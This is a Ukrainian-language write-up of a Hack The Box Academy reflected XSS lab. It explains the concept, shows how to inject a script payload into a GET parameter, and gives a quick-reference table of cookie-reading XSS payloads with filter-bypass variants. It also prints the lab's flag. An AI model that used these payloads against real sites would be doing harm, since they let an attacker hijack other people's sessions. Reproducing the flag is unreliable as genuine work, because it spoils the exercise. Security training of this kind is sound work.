## XSS — Reflected XSS: `document.cookie`

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [Reflected XSS](https://academy.hackthebox.com/app/module/103/section/973)
**Завдання:** Змінити JS-payload щоб показав cookie замість URL
**Прапор:** `HTB{r3fl3c73d_b4ck_2_m3}`

***

## Концепція

**Reflected XSS (Non-Persistent XSS)** — payload не зберігається на сервері, а одразу відображається ("відбивається") у відповіді. Вектор: GET-параметр у URL, який сервер вставляє в HTML без санітизації. Потребує, щоб жертва перейшла за спеціально сформованим посиланням.

***

## Вихідний payload (з теорії модуля)

```html
<script>alert(window.origin)</script>
```

Підтверджує XSS — показує поточний URL у alert-і.

***

## Payload для отримання прапора

```html
<script>alert(document.cookie)</script>
```

***

## Кроки

1. Відкриваємо ціль `http://TARGET_IP:TARGET_PORT/` — знаходимо GET-параметр у URL (`?task=` або подібний).
2. Підставляємо payload напряму в URL:
   ```
   http://TARGET_IP:TARGET_PORT/index.php?task=<script>alert(document.cookie)</script>
   ```
3. Натискаємо Enter — браузер завантажує сторінку, сервер вставляє значення параметра в HTML без екранування.
4. Браузер виконує `<script>` → alert показує куки → копіюємо `flag=HTB{...}`.

***

## Альтернатива — Firefox DevTools

**Варіант A — Console:**
```javascript
// F12 → Console
document.cookie
```

**Варіант B — Storage Inspector:**
```
F12 → Storage → Cookies → [ім'я хоста]
```

***

## Різниця: Stored vs Reflected XSS

| | Stored XSS | Reflected XSS |
|---|---|---|
| Зберігається на сервері | ✅ Так | ❌ Ні |
| Вектор | Поле вводу / форма | GET/POST параметр |
| Жертва | Будь-хто, хто відкриє сторінку | Той, хто перейде за посиланням |
| Небезпека | Вища (масова атака) | Нижча (потребує соціальної інженерії) |
| Приклад URL | — | `?task=<script>...</script>` |

***

## XSS Quick Reference (оновлено)

| Payload | Призначення |
|---|---|
| `<script>alert(window.origin)</script>` | Підтвердити XSS (показує URL) |
| `<script>alert(document.cookie)</script>` | Витягнути куки сесії |
| `<img src=x onerror=alert(document.cookie)>` | Bypass якщо `<script>` фільтрується |
| `<svg onload=alert(document.cookie)>` | Альтернативний вектор через SVG |
| `"onmouseover="alert(document.cookie)` | Bypass через HTML атрибут |

***

## Прапор

```
HTB{r3fl3c73d_b4ck_2_m3}
```
